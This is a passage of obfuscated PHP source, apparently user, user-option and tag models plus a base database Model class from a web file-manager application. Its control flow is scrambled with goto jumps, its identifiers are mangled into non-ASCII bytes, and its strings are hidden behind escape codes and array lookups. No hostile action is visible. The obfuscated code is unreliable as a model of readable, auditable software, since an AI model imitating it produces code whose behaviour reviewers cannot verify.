$bÆ…Ë®¶‡Ï[$Aš¨•Èµƒ÷[2092]]; $EÃñçæá±È = isset($bÆ…Ë®¶‡Ï[$Aš¨•Èµƒ÷[2093]]) ? $bÆ…Ë®¶‡Ï[$Aš¨•Èµƒ÷[2093]] : !1; goto Dù¥®´Ş; CÜÇô ¾˜ù: if (!$EİŞ†ƒµ) { $e¤¶ª§¸»ˆ = array(); } if (isset($bÆ…Ë®¶‡Ï[$Aš¨•Èµƒ÷[686]])) { $e¤¶ª§¸»ˆ[$Aš¨•Èµƒ÷[686]] = $bÆ…Ë®¶‡Ï[$Aš¨•Èµƒ÷[686]]; } $A¿ñóåÂó§ = $this->_makeOrder()->where($e¤¶ª§¸»ˆ)->selectPage(20); goto fõ²Ó”‹¿; AÓÛİŠÓË: } private function _filterByGroup(&$DƒŸ•‚©Ş, $C†Ğ¤¯áï”) { $Dƒ®°ŸÈÂ =& $_SERVER[¿õñ]; if (!$C†Ğ¤¯áï”) { return $DƒŸ•‚©Ş; } foreach ($DƒŸ•‚©Ş[$Dƒ®°ŸÈÂ[350]] as $Bƒ†·†ÜÅ¹ => &$A½ğÛ©Äôà) { $aÄÎÏİ™‹© = array_to_keyvalue($A½ğÛ©Äôà[$Dƒ®°ŸÈÂ[2415]], $Dƒ®°ŸÈÂ[33], $Dƒ®°ŸÈÂ[2013]); if (!in_array($C†Ğ¤¯áï”, $aÄÎÏİ™‹©)) { unset($DƒŸ•‚©Ş[$Dƒ®°ŸÈÂ[350]][$Bƒ†·†ÜÅ¹]); } } $DƒŸ•‚©Ş[$Dƒ®°ŸÈÂ[350]] = array_values($DƒŸ•‚©Ş[$Dƒ®°ŸÈÂ[350]]); $DƒŸ•‚©Ş[$Dƒ®°ŸÈÂ[347]] = array($Dƒ®°ŸÈÂ[2208] => count($DƒŸ•‚©Ş[$Dƒ®°ŸÈÂ[350]]), $Dƒ®°ŸÈÂ[2206] => $DƒŸ•‚©Ş[$Dƒ®°ŸÈÂ[347]][$Dƒ®°ŸÈÂ[345]], $Dƒ®°ŸÈÂ[2205] => 1, $Dƒ®°ŸÈÂ[2207] => 1); } private function _filterUserList(&$Dø‚Ú“«‹Œ) { $fÌˆ×ØÜš± =& $_SERVER[¿õñ]; foreach ($Dø‚Ú“«‹Œ[$fÌˆ×ØÜš±[350]] as $C·‘¯­Ï† => &$A£òæ¯ĞÅİ) { unset($A£òæ¯ĞÅİ[$fÌˆ×ØÜš±[413]]); } } private function _searchFromMeta($dâ¯ÍÏœĞ–, $D…øÚ™µµ®, $e¤Ì²Äâø) { goto f®¤ù¹«†á; dİ©ªïÃ¸: $Cé¢Ã”©¨Ç = $this->where(array($d¼²Œ¨ÇóÑ[1341] => array($d¼²Œ¨ÇóÑ[7], $FèÄÏØ¹íÄ)))->select(); if (!$Cé¢Ã”©¨Ç) { return array(); } return $Cé¢Ã”©¨Ç; goto AÑÖù¶Å™å; EÌàÈ¹í­£: $FèÄÏØ¹íÄ = Model($d¼²Œ¨ÇóÑ[2416])->where($EÀìÓè»†—)->limit($e¤Ì²Äâø)->select(); if (!$FèÄÏØ¹íÄ) { return array(); } $FèÄÏØ¹íÄ = array_to_keyvalue($FèÄÏØ¹íÄ, $d¼²Œ¨ÇóÑ[33], $d¼²Œ¨ÇóÑ[1350]); goto dİ©ªïÃ¸; f®¤ù¹«†á: $d¼²Œ¨ÇóÑ =& $_SERVER[¿õñ]; $D…øÚ™µµ® = strtolower($D…øÚ™µµ®); $EÀìÓè»†— = array($d¼²Œ¨ÇóÑ[88] => $dâ¯ÍÏœĞ–, $d¼²Œ¨ÇóÑ[354] => array($d¼²Œ¨ÇóÑ[758], "\x25{$D…øÚ™µµ®}\45")); goto EÌàÈ¹í­£; AÑÖù¶Å™å: } private function _listDataApplyItem($cÛÆñÂ¯Óè) { $AĞÂç†‡± = array($cÛÆñÂ¯Óè); $this->_listDataApply($AĞÂç†‡±); return $AĞÂç†‡±[0]; } private function _listDataApply(&$EòË²š¹ª‡, $a­Âœó¸Ï = "\x67\162\x6f\x75\160\x2c\x6d\145\164\141\54\163\157\x75\x72\143\x65") { goto Eà–ÊÉ«ãŒ; bÛŠ¦›Ñ„Â: if (in_array($fÇ‘ÛÃÔÖ¸[2417], $a­Âœó¸Ï)) { $this->_listAppendMeta($EòË²š¹ª‡, $F‘‚Ÿ«™); } if (in_array($fÇ‘ÛÃÔÖ¸[379], $a­Âœó¸Ï)) { $this->_listAppendSourceRoot($EòË²š¹ª‡, $F‘‚Ÿ«™); } goto a²ÔêÉ¹ˆİ; Eà–ÊÉ«ãŒ: $fÇ‘ÛÃÔÖ¸ =& $_SERVER[¿õñ]; if (!$EòË²š¹ª‡) { return; } array_remove_key($EòË²š¹ª‡, $fÇ‘ÛÃÔÖ¸[808]); goto Fé Íã’õñ; Fé Íã’õñ: $F‘‚Ÿ«™ = array_to_keyvalue($EòË²š¹ª‡, $fÇ‘ÛÃÔÖ¸[33], $fÇ‘ÛÃÔÖ¸[1350]); $a­Âœó¸Ï = explode($fÇ‘ÛÃÔÖ¸[47], $a­Âœó¸Ï); if (in_array($fÇ‘ÛÃÔÖ¸[978], $a­Âœó¸Ï)) { $this->_listAppendGroup($EòË²š¹ª‡, $F‘‚Ÿ«™); } goto bÛŠ¦›Ñ„Â; a²ÔêÉ¹ˆİ: } private function _listAppendSourceRoot(&$b‚Ã ƒÇ‡, $a™ØãÍÀ¬Œ) { goto BÍ½Şæäº; díÅ°äÁ¬ğ: foreach ($b‚Ã ƒÇ‡ as &$fâ¥î´Ÿ•) { $fâ¥î´Ÿ•[$fç´­¯Ü[388]] = $a˜±Å§‘[$fâ¥î´Ÿ•[$fç´­¯Ü[1350]]] ? $a˜±Å§‘[$fâ¥î´Ÿ•[$fç´­¯Ü[1350]]] : array(); } goto E’Ì®Ë±…¦; e’¶Õ‹Öè: $a˜±Å§‘ = Model($fç´­¯Ü[759])->order($fç´­¯Ü[2103])->field($Fœ¡‰ÅóÌ)->where($BŸƒ¸¥Ü§ã)->select(); $a˜±Å§‘ = array_to_keyvalue($a˜±Å§‘, $fç´­¯Ü[452]); $a˜±Å§‘ = array_remove_key($a˜±Å§‘, $fç´­¯Ü[452]); goto díÅ°äÁ¬ğ; BÍ½Şæäº: $fç´­¯Ü =& $_SERVER[¿õñ]; $BŸƒ¸¥Ü§ã = array($fç´­¯Ü[457] => 0, $fç´­¯Ü[368] => SourceModel::TYPE_USER, $fç´­¯Ü[452] => array($fç´­¯Ü[7], $a™ØãÍÀ¬Œ)); $Fœ¡‰ÅóÌ = $fç´­¯Ü[2102]; goto e’¶Õ‹Öè; E’Ì®Ë±…¦: } private function _listAppendGroup(&$eµ­·™á„Ô, $A”†æŠ˜ñ) { goto d©·Ù÷çëñ; e¤ŠøÁî¨¯: $D‘Ç¢ø¬²î = array($D „‚Ñ[2013] => array($D „‚Ñ[7], $dĞ×îªÍ¦¶)); $aìàëŞ‘Öò = Model($D „‚Ñ[2418])->field($D „‚Ñ[2419])->where($D‘Ç¢ø¬²î)->select(); $d•É´¡çŠ = array_to_keyvalue($aìàëŞ‘Öò, $D „‚Ñ[2013], $D „‚Ñ[28]); goto dÑ½Õá¹Ù; d©·Ù÷çëñ: $D „‚Ñ =& $_SERVER[¿õñ]; $D‘Ç¢ø¬²î = array($D „‚Ñ[1350] => array($D „‚Ñ[7], $A”†æŠ˜ñ)); $c÷ƒ›ê¥ãê = Model($D „‚Ñ[2090])->where($D‘Ç¢ø¬²î)->select(); goto B©¢Ğ¦Ñàğ; dÑ½Õá¹Ù: $c÷ƒ›ê¥ãê = array_to_keyvalue_group($c÷ƒ›ê¥ãê, $D „‚Ñ[1350]); foreach ($c÷ƒ›ê¥ãê as &$DÂ˜‡Ü‹Ú½) { $D«ìÜñØ§µ = array(); foreach ($DÂ˜‡Ü‹Ú½ as $BÊÜõ¤¹) { if (!$BÊÜõ¤¹[$D „‚Ñ[2144]]) { continue; } $AŠ ‡‰­¼ = Model($D „‚Ñ[2160])->listData($BÊÜõ¤¹[$D „‚Ñ[2144]]); $D«ìÜñØ§µ[] = array($D „‚Ñ[2013] => $BÊÜõ¤¹[$D „‚Ñ[2013]], $D „‚Ñ[2420] => $d•É´¡çŠ[$BÊÜõ¤¹[$D „‚Ñ[2013]]], $D „‚Ñ[373] => $AŠ ‡‰­¼); } $DÂ˜‡Ü‹Ú½ = $D«ìÜñØ§µ; } foreach ($eµ­·™á„Ô as &$bÆ±Õ”ÕŒÒ) { $bÆ±Õ”ÕŒÒ[$D „‚Ñ[2415]] = array(); if (isset($c÷ƒ›ê¥ãê[$bÆ±Õ”ÕŒÒ[$D „‚Ñ[1350]]])) { $bÆ±Õ”ÕŒÒ[$D „‚Ñ[2415]] = $c÷ƒ›ê¥ãê[$bÆ±Õ”ÕŒÒ[$D „‚Ñ[1350]]]; } } goto CÛÊË»ô…; B©¢Ğ¦Ñàğ: $dĞ×îªÍ¦¶ = array_to_keyvalue($c÷ƒ›ê¥ãê, $D „‚Ñ[33], $D „‚Ñ[2013]); $dĞ×îªÍ¦¶ = array_remove_value(array_unique($dĞ×îªÍ¦¶), $D „‚Ñ[464]); if (!$dĞ×îªÍ¦¶ || !$c÷ƒ›ê¥ãê) { return; } goto e¤ŠøÁî¨¯; CÛÊË»ô…: } private function _listAppendMeta(&$bŒªÃÔòŠÂ, $Dœ” øÉ) { goto a°»¾”” ; a°»¾”” : $d‰îÀÁªŞÇ =& $_SERVER[¿õñ]; $DŒç×´£„ = UserJobModel::JOB_KEY; $B‡²¢Ø©èâ = array($d‰îÀÁªŞÇ[2394]); goto AªèÔêß”³; AªèÔêß”³: $e…ŸÜÉËØ– = array($d‰îÀÁªŞÇ[1350] => array($d‰îÀÁªŞÇ[7], $Dœ” øÉ)); $d¨ğÌ§ÃİŒ = Model($d‰îÀÁªŞÇ[2391])->where($e…ŸÜÉËØ–)->select(); $d¨ğÌ§ÃİŒ = array_to_keyvalue_group($d¨ğÌ§ÃİŒ, $d‰îÀÁªŞÇ[1350]); goto BÀ¦¿‘­¯Œ; BÀ¦¿‘­¯Œ: foreach ($d¨ğÌ§ÃİŒ as &$FíÌ–ğå½Â) { $bÑ›Œ¤éğ = array(); foreach ($FíÌ–ğå½Â as $BøİÒ÷©‹…) { if (!in_array($BøİÒ÷©‹…[$d‰îÀÁªŞÇ[88]], $B‡²¢Ø©èâ)) { $bÑ›Œ¤éğ[$BøİÒ÷©‹…[$d‰îÀÁªŞÇ[88]]] = $BøİÒ÷©‹…[$d‰îÀÁªŞÇ[354]]; } } $FíÌ–ğå½Â = $bÑ›Œ¤éğ; } $CÆº¬°Õìó = Model($d‰îÀÁªŞÇ[2421]); foreach ($bŒªÃÔòŠÂ as &$b”‘Ó‚£Á) { $b”‘Ó‚£Á[$d‰îÀÁªŞÇ[413]] = array(); $b”‘Ó‚£Á[$d‰îÀÁªŞÇ[2422]] = array(); if (isset($d¨ğÌ§ÃİŒ[$b”‘Ó‚£Á[$d‰îÀÁªŞÇ[1350]]])) { $b”‘Ó‚£Á[$d‰îÀÁªŞÇ[413]] = $d¨ğÌ§ÃİŒ[$b”‘Ó‚£Á[$d‰îÀÁªŞÇ[1350]]]; } if (isset($b”‘Ó‚£Á[$d‰îÀÁªŞÇ[413]][$DŒç×´£„])) { $b”‘Ó‚£Á[$d‰îÀÁªŞÇ[2422]] = $CÆº¬°Õìó->getUserJobInfo($b”‘Ó‚£Á[$d‰îÀÁªŞÇ[413]][$DŒç×´£„]); } } goto CÎĞ³…™; CÎĞ³…™: } public function userSearch($FƒÛ¥²­…Ä, $bÛëŒ«ã³† = "\52") { return Model($_SERVER[¿õñ][469])->where($FƒÛ¥²­…Ä)->field($bÛëŒ«ã³†)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\x72\x5f\x6f\x70\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($aèà§“ÄÓº) { return "\x55\163\x65\x72\117\160\x74\151\x6f\156\137{$aèà§“ÄÓº}\137" . USER_ID; } protected function filterWhere($FÖŠºÁîƒë) { $FÖŠºÁîƒë[$_SERVER[¿õñ][1350]] = USER_ID; return $FÖŠºÁîƒë; } public function cacheRemoveUser($A…Õ™è´™¼, $bÄí¡Ş› ˜) { return Cache::remove("\x55\163\x65\x72\117\160\164\x69\x6f\156\x5f{$A…Õ™è´™¼}\137" . $bÄí¡Ş› ˜); } public function get($d¾ÒÚ¤ŸÂƒ = false, $AŸ››©‡·½ = '', $d­Áºµó­² = false) { goto e•›‚Â¾˜Œ; e•›‚Â¾˜Œ: $c›¤ÍÁ®®™ =& $_SERVER[¿õñ]; $c„¡æ¶ÎÃ = parent::get($d¾ÒÚ¤ŸÂƒ, $AŸ››©‡·½, $d­Áºµó­²); if (!is_null($c„¡æ¶ÎÃ)) { return $c„¡æ¶ÎÃ; } goto Cä™ßïË”’; aÎ¶Â‹Äí: if (!$d¾ÒÚ¤ŸÂƒ) { return $B‰¾ÎàŒ; } else { return $B‰¾ÎàŒ[$d¾ÒÚ¤ŸÂƒ]; } goto F¥†Ãõ¯ì±; Cä™ßïË”’: global $config; $F¾¢‚ª¢Ó = array($c›¤ÍÁ®®™[33] => $c›¤ÍÁ®®™[2423], $c›¤ÍÁ®®™[2424] => $c›¤ÍÁ®®™[2425]); $B‰¾ÎàŒ = $config[$F¾¢‚ª¢Ó[$AŸ››©‡·½]]; goto aÎ¶Â‹Äí; F¥†Ãõ¯ì±: } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\162\x2e\x74\x61\147\114\151\x73\x74"; public $modelType = "\125\163\x65\162\x4f\160\164\151\x6f\x6e"; public $field = array("\x6e\141\155\x65", "\x73\x74\171\154\x65", "\x73\x6f\162\164"); public function listData($aƒâáÇš÷ = false, $B­ù¨±¾Ê’ = "\x73\157\162\164", $A³œÓÌã¡ = false) { return parent::listData($aƒâáÇš÷, $B­ù¨±¾Ê’, $A³œÓÌã¡); } public function remove($C³·ÌÆìÈ) { return parent::remove($C³·ÌÆìÈ); } public function add($Cƒ¨“¿îÉ, $BàÂ—‚ˆµ• = "\x6c\141\x62\145\x6c\55\147\162\x65\x79\x2d\x6e\x6f\x72\x6d\x61\x6c") { $E‘á²ßœ¾ô =& $_SERVER[¿õñ]; if ($this->findByName($Cƒ¨“¿îÉ)) { return !1; } $fçÛåˆº†Á = array($E‘á²ßœ¾ô[383] => $Cƒ¨“¿îÉ, $E‘á²ßœ¾ô[433] => $BàÂ—‚ˆµ•, $E‘á²ßœ¾ô[2017] => $this->getSort($E‘á²ßœ¾ô[243]) + 1); return parent::insert($fçÛåˆº†Á); } public function update($FÒÛìÙÇ£é, $FÙ†Ô¶Ñ×Æ) { $a¼¨Âöš¦Ï =& $_SERVER[¿õñ]; $aÊ›äñ’÷å = $this->listData($FÒÛìÙÇ£é); $A¨âñÙÈµ = $this->findByName($FÙ†Ô¶Ñ×Æ[$a¼¨Âöš¦Ï[28]]); if (!$aÊ›äñ’÷å || $A¨âñÙÈµ && $A¨âñÙÈµ[$a¼¨Âöš¦Ï[364]] != $aÊ›äñ’÷å[$a¼¨Âöš¦Ï[364]]) { return !1; } return parent::update($FÒÛìÙÇ£é, $FÙ†Ô¶Ñ×Æ); } public function moveTop($aÄï¨œÖ’Ş) { $E’±„·´†¦ =& $_SERVER[¿õñ]; $EøŞ—Ğãø„ = parent::listData(); $C¡»äÂœá = $this->getSort($E’±„·´†¦[242]); foreach ($EøŞ—Ğãø„ as &$E¼ÒÛÛ‡‰…) { if ($E¼ÒÛÛ‡‰…[$E’±„·´†¦[364]] == $aÄï¨œÖ’Ş) { $E¼ÒÛÛ‡‰…[$E’±„·´†¦[2034]] = $C¡»äÂœá; continue; } $E¼ÒÛÛ‡‰…[$E’±„·´†¦[2034]] += 1; } return parent::resetData($EøŞ—Ğãø„); } public function moveBottom($A’³ç†¹ƒ®) { $b’ë†ì«Í =& $_SERVER[¿õñ]; $DÓîğ”Ö­ = $this->getSort($b’ë†ì«Í[243]) + 1; return parent::update($A’³ç†¹ƒ®, array($b’ë†ì«Í[2034] => $DÓîğ”Ö­)); } public function resetSort($có”©ÑÅÕ–) { $C„Êˆ§«§ =& $_SERVER[¿õñ]; $C¥†ŒÉ¼×£ = array(); for ($c‰‚÷‚÷ = 0; $c‰‚÷‚÷ < count($có”©ÑÅÕ–); $c‰‚÷‚÷++) { $C¥†ŒÉ¼×£[$có”©ÑÅÕ–[$c‰‚÷‚÷] . $C„Êˆ§«§[33]] = $c‰‚÷‚÷ + 1; } $c±êÆŠçƒ  = parent::listData(); foreach ($c±êÆŠçƒ  as &$c‹‚’›¦œ) { $báÃºå‰àñ = $C¥†ŒÉ¼×£[$c‹‚’›¦œ[$C„Êˆ§«§[364]]]; $c‹‚’›¦œ[$C„Êˆ§«§[2034]] = $báÃºå‰àñ ? $báÃºå‰àñ : $c‹‚’›¦œ[$C„Êˆ§«§[2034]]; } return parent::resetData($c±êÆŠçƒ ); } private function getSort($a’Ú­¬àªó) { $C„œöÙ«öª =& $_SERVER[¿õñ]; $C´É¼¦šŒØ = parent::listData(); $cËØßŠ”¼… = array_to_keyvalue($C´É¼¦šŒØ, $C„œöÙ«öª[33], $C„œöÙ«öª[2034]); if (!$cËØßŠ”¼…) { $cËØßŠ”¼… = array(0); } $DÆÆÛ»¡ÄÎ = $a’Ú­¬àªó == $C„œöÙ«öª[243] ? max($cËØßŠ”¼…) : min($cËØßŠ”¼…); return intval($DÆÆÛ»¡ÄÎ); } } goto EŞ«µ™›«·; fÛ«‘”½é¶: define($_SERVER[¿õñ][227], 0); define($_SERVER[¿õñ][228], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\154\x65", "\157\x72\144\145\x72", "\141\x6c\x69\x61\163", "\150\141\x76\151\x6e\x67", "\x67\162\157\x75\160", "\154\157\x63\x6b", "\144\151\x73\x74\x69\x6e\143\164", "\x61\165\x74\157", "\146\151\154\x74\145\x72", "\166\141\x6c\151\144\x61\164\x65", "\x72\145\163\165\x6c\164", "\x62\151\x6e\x64", "\164\157\x6b\x65\156"); public function __construct($EŒ ÷ëÅŠ = '', $dÛŒÛâ‡¦ = '', $DÃ°¨Ë»éø = '') { $F¤Îçƒ¿¢‡ =& $_SERVER[¿õñ]; $this->_initialize(); if (!empty($EŒ ÷ëÅŠ)) { if (strpos($EŒ ÷ëÅŠ, $F¤Îçƒ¿¢‡[92])) { list($this->dbName, $this->name) = explode($F¤Îçƒ¿¢‡[92], $EŒ ÷ëÅŠ); } else { $this->name = $EŒ ÷ëÅŠ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($dÛŒÛâ‡¦)) { $this->tablePrefix = $F¤Îçƒ¿¢‡[33]; } elseif ($F¤Îçƒ¿¢‡[33] != $dÛŒÛâ‡¦) { $this->tablePrefix = $dÛŒÛâ‡¦; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($F¤Îçƒ¿¢‡[229]); } $this->db(0, empty($this->connection) ? $DÃ°¨Ë»éø : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $aˆ‰ãâÎˆš =& $_SERVER[¿õñ]; if (empty($this->fields)) { if (think_config($aˆ‰ãâÎˆš[230])) { $e«Œ±ƒ”îƒ = $this->dbName ? $this->dbName : think_config($aˆ‰ãâÎˆš[231]); $Fïí³è’¼ = think_var_cache($aˆ‰ãâÎˆš[232] . strtolower(get_path_this($e«Œ±ƒ”îƒ) . $aˆ‰ãâÎˆš[92] . $this->name)); if ($Fïí³è’¼) { $A•ƒéî¬ª× = think_config($aˆ‰ãâÎˆš[233]); if (empty($A•ƒéî¬ª×) || $Fïí³è’¼[$aˆ‰ãâÎˆš[234]] == $A•ƒéî¬ª×) { $this->fields = $Fïí³è’¼; return; } } } $this->flush(); } } public function flush() { goto b˜³Á¼½ñ£; Bƒ‡å†Œ’´: if (!$CĞªî•¸Ö) { return !1; } $this->fields = array_keys($CĞªî•¸Ö); $this->fields[$AŠŸ÷õã†à[235]] = !1; goto EÂßËó¿—Ú; b˜³Á¼½ñ£: $AŠŸ÷õã†à =& $_SERVER[¿õñ]; $this->db->setModel($this->name); $CĞªî•¸Ö = $this->db->getFields($this->getTableName()); goto Bƒ‡å†Œ’´; EÂßËó¿—Ú: foreach ($CĞªî•¸Ö as $Cßœ”µ¸•ó => $Bí˜”ÑÔÖ) { $e½ëö·èØ[$Cßœ”µ¸•ó] = $Bí˜”ÑÔÖ[$AŠŸ÷õã†à[29]]; if ($Bí˜”ÑÔÖ[$AŠŸ÷õã†à[36]]) { $this->fields[$AŠŸ÷õã†à[236]] = $Cßœ”µ¸•ó; if ($Bí˜”ÑÔÖ[$AŠŸ÷õã†à[39]]) { $this->fields[$AŠŸ÷õã†à[235]] = !0; } } } $this->fields[$AŠŸ÷õã†à[237]] = $e½ëö·èØ; if (think_config($AŠŸ÷õã†à[233])) { $this->fields[$AŠŸ÷õã†à[234]] = think_config($AŠŸ÷õã†à[233]); } goto C¼–¼ªÁóÉ; C¼–¼ªÁóÉ: if (think_config($AŠŸ÷õã†à[230])) { $E²ö†æƒ = $this->dbName ? $this->dbName : think_config($AŠŸ÷õã†à[231]); think_var_cache($AŠŸ÷õã†à[232] . strtolower(get_path_this($E²ö†æƒ) . $AŠŸ÷õã†à[92] . $this->name), $this->fields); } goto aÓåÆ¬íÛ; aÓåÆ¬íÛ: } public function switchModel($aéÑ±×ƒ“å, $e§ ç‡ £ = array()) { $B‹…ô›íó =& $_SERVER[¿õñ]; $cÁİÇ›¤Ù = ucwords(strtolower($aéÑ±×ƒ“å)) . $B‹…ô›íó[238]; if (!class_exists($cÁİÇ›¤Ù)) { think_exception($cÁİÇ›¤Ù . think_lang($B‹…ô›íó[239])); } $this->_extModel = new $cÁİÇ›¤Ù($this->name); if (!empty($e§ ç‡ £)) { foreach ($e§ ç‡ £ as $f…¶Ü­Ãğ®) { $this->_extModel->setProperty($f…¶Ü­Ãğ®, $this->{$f…¶Ü­Ãğ®}); } } return $this->_extModel; } public function __set($f‘Àçô†É, $cÉ¦±—„µŒ) { $this->data[$f‘Àçô†É] = $cÉ¦±—„µŒ; } public function __get($CŒ«ƒí˜µ‘) { return isset($this->data[$CŒ«ƒí˜µ‘]) ? $this->data[$CŒ«ƒí˜µ‘] : null; } public function __isset($côÅ÷Æ›Ñ¿) { return isset($this->data[$côÅ÷Æ›Ñ¿]); } public function __unset($Dí´²§¨) { unset($this->data[$Dí´²§¨]); } public function __call($Bšƒ›»‚òÊ, $A¤ªÚ¥Ğ–Ê) { $A¸î…ô¯† =& $_SERVER[¿õñ]; if (in_array(strtolower($Bšƒ›»‚òÊ), $this->methods, !0)) { $this->options[strtolower($Bšƒ›»‚òÊ)] = $A¤ªÚ¥Ğ–Ê[0]; return $this; } elseif (in_array(strtolower($Bšƒ›»‚òÊ), array($A¸î…ô¯†[240], $A¸î…ô¯†[241], $A¸î…ô¯†[242], $A¸î…ô¯†[243], $A¸î…ô¯†[244]), !0)) { $E¯á áƒù¿ = isset($A¤ªÚ¥Ğ–Ê[0]) ? $A¤ªÚ¥Ğ–Ê[0] : $A¸î…ô¯†[173]; $E¯á áƒù¿ = $this->db->parseKey($E¯á áƒù¿); return $this->getField(strtoupper($Bšƒ›»‚òÊ) . $A¸î…ô¯†[245] . $E¯á áƒù¿ . $A¸î…ô¯†[246] . $Bšƒ›»‚òÊ, $A¸î…ô¯†[240]); } elseif (strtolower(substr($Bšƒ›»‚òÊ, 0, 5)) == $A¸î…ô¯†[247]) { $E¯á áƒù¿ = think_parse_name(substr($Bšƒ›»‚òÊ, 5)); $aø´ö·Œ»[$E¯á áƒù¿] = $A¤ªÚ¥Ğ–Ê[0]; return $this->where($aø´ö·Œ»)->find(); } elseif (strtolower(substr($Bšƒ›»‚òÊ, 0, 10)) == $A¸î…ô¯†[248]) { $cİô¾‹¨Âğ = think_parse_name(substr($Bšƒ›»‚òÊ, 10)); $aø´ö·Œ»[$cİô¾‹¨Âğ] = $A¤ªÚ¥Ğ–Ê[0]; return $this->where($aø´ö·Œ»)->getField($A¤ªÚ¥Ğ–Ê[1]); } elseif (isset($this->_scope[$Bšƒ›»‚òÊ])) { return $this->scope($Bšƒ›»‚òÊ, $A¤ªÚ¥Ğ–Ê[0]); } elseif (method_exists($this, $Bšƒ›»‚òÊ)) { array_unshift($A¤ªÚ¥Ğ–Ê, $Bšƒ›»‚òÊ); return call_user_func_array(array($this, $A¸î…ô¯†[249]), $A¤ªÚ¥Ğ–Ê); } else { return call_user_func_array(array(parent, $Bšƒ›»‚òÊ), $A¤ªÚ¥Ğ–Ê); } } protected function call() { goto AÜ÷ñ¢Ïä¢; e«ÌĞ¸ÅÕ¤: if (method_exists($this, $f¨Ó‰ ô•ë[253])) { $fñÊêé²ó = call_user_func_array(array($this, $f¨Ó‰ ô•ë[254]), array($E¸ë‰ãµ, $a‡Ù“øã–È, $eŒ¿»‰Çƒ)); if ($fñÊêé²ó) { return $fñÊêé²ó; } } return $eŒ¿»‰Çƒ; goto C…Æ÷…èÅ; AÜ÷ñ¢Ïä¢: $f¨Ó‰ ô•ë =& $_SERVER[¿õñ]; $a‡Ù“øã–È = func_get_args(); $F‹ŞÓÏ¤Å× = array_shift($a‡Ù“øã–È); goto B¯³Ã´•¾â; bİ® Ù×Á: $a‡Ù“øã–È[] = $F‹ŞÓÏ¤Å×; if (method_exists($this, $f¨Ó‰ ô•ë[251])) { $fñÊêé²ó = call_user_func_array(array($this, $f¨Ó‰ ô•ë[252]), array($E¸ë‰ãµ, $a‡Ù“øã–È)); if (!is_null($fñÊêé²ó) && $fñÊêé²ó !== !1) { return $fñÊêé²ó; } } $eŒ¿»‰Çƒ = call_user_func_array(array($this, $F‹ŞÓÏ¤Å×), $a‡Ù“øã–È); goto e«ÌĞ¸ÅÕ¤; B¯³Ã´•¾â: $E¸ë‰ãµ = $F‹ŞÓÏ¤Å×; if (is_array($F‹ŞÓÏ¤Å×)) { $E¸ë‰ãµ = $F‹ŞÓÏ¤Å×[1]; $F‹ŞÓÏ¤Å× = $F‹ŞÓÏ¤Å×[0]; } if ($a‡Ù“øã–È[count($a‡Ù“øã–È) - 1] === $F‹ŞÓÏ¤Å×) { think_exception(__CLASS__ . $f¨Ó‰ ô•ë[4] . $F‹ŞÓÏ¤Å× . think_lang($f¨Ó‰ ô•ë[250])); return; } goto bİ® Ù×Á; C…Æ÷…èÅ: } protected function _initialize() { } protected function _facade($f¹ãœ¿…Ó) { $D–òµ»Â¶ =& $_SERVER[¿õñ]; if (!empty($this->fields)) { foreach ($f¹ãœ¿…Ó as $F§ç“Şà°½ => $e‚öÎ¦áĞé) { if (!in_array($F§ç“Şà°½, $this->fields, !0)) { unset($f¹ãœ¿…Ó[$F§ç“Şà°½]); } elseif (is_scalar($e‚öÎ¦áĞé)) { $this->_parseType($f¹ãœ¿…Ó, $F§ç“Şà°½); } } } if (!empty($this->options[$D–òµ»Â¶[255]])) { $f¹ãœ¿…Ó = array_map($this->options[$D–òµ»Â¶[255]], $f¹ãœ¿…Ó); unset($this->options[$D–òµ»Â¶[255]]); } $this->_beforeWrite($f¹ãœ¿…Ó); return $f¹ãœ¿…Ó; } protected function _beforeWrite(&$cÂ—êíï¸) { } public function add($bˆìö†–Üë = '', $bÔŒ¾ÊÁÔÕ = array(), $B§—Ù©¤ = false) { goto B÷×„á‡‡Ó; f¾©ƒÃÍ£: return $c–î¡±éÅ; goto EÇÍç½öË; B÷×„á‡‡Ó: if (empty($bˆìö†–Üë)) { if (!empty($this->data)) { $bˆìö†–Üë = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¿õñ][256]); return !1; } } $bÔŒ¾ÊÁÔÕ = $this->_parseOptions($bÔŒ¾ÊÁÔÕ); $bˆìö†–Üë = $this->_facade($bˆìö†–Üë); goto F½‚ÉÊ°šœ; F½‚ÉÊ°šœ: if (!1 === $this->_beforeInsert($bˆìö†–Üë, $bÔŒ¾ÊÁÔÕ)) { return !1; } $c–î¡±éÅ = $this->db->insert($bˆìö†–Üë, $bÔŒ¾ÊÁÔÕ, $B§—Ù©¤); if (!1 !== $c–î¡±éÅ) { $f‡­óÑ”ãİ = $this->getLastInsID(); if ($f‡­óÑ”ãİ) { $bˆìö†–Üë[$this->getPk()] = $f‡­óÑ”ãİ; $this->_after_insert($bˆìö†–Üë, $bÔŒ¾ÊÁÔÕ); return $f‡­óÑ”ãİ; } $this->_after_insert($bˆìö†–Üë, $bÔŒ¾ÊÁÔÕ); } goto f¾©ƒÃÍ£; EÇÍç½öË: } protected function _beforeInsert(&$aµ™ë÷¿¿¯, $eÓÁÒÄË¸¿) { } protected function _after_insert($fßšáÂ¬Ë, $c±¨µÑ±É) { } public function addAll($d‹œ¿ùÍùŒ, $b’®æÀ˜³ù = array(), $dº‰ƒ»éÁƒ = false) { goto AôæˆËÊ÷; b½Üçù¾”õ: foreach ($d‹œ¿ùÍùŒ as $C Í™§›ô => $d„Ã­ìÜƒÀ) { $d‹œ¿ùÍùŒ[$C Í™§›ô] = $this->_facade($d„Ã­ìÜƒÀ); } if (method_exists($this->db, $dÙ‹¢…ëÏ[257])) { $Cä‰ˆŠïçè = $this->db->insertAll($d‹œ¿ùÍùŒ, $b’®æÀ˜³ù, 